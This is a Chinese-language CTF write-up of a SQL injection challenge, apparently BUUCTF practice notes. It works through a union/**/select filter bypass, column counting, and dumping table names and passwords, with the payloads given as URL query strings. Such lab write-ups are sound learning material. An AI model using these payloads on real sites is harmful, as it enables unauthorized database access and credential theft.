考察知识点：

1.union/**/select sql注入



1. 过滤测试

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/2F2A912D6205492A8BB43F6C8712D80Bclipboard.png)

虽然select被过滤但是union/**/select还可以使用



2.确定字段数

构造：

```javascript
?username=admin&password=admin'union/**/select+null,null,null#
```

当null的数量为四时，报错，所以查询数据库表有四个字段



3.确定回显点

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/6F8CD6FE04AA4D669B7F1B8D70A0217Fclipboard.png)

用户密码可用作回显点



4. 暴库

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/4B44CC4AFE5044CF9D38CAD2F8F551DAclipboard.png)



5.爆表

```javascript
/check.php?username=admin&password=admin'union/**/select+null,null,group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database();%23
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/136122CFDB2F45E5A67310A0666431BDclipboard.png)



6. 爆字段内容

```javascript
?username=admin&password=admin'union/**/select+null,null,group_concat(password)/**/from/**/l0ve1ysq1;%23
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/8A268906AC3D448CBA8F49C088F32D90clipboard.png)

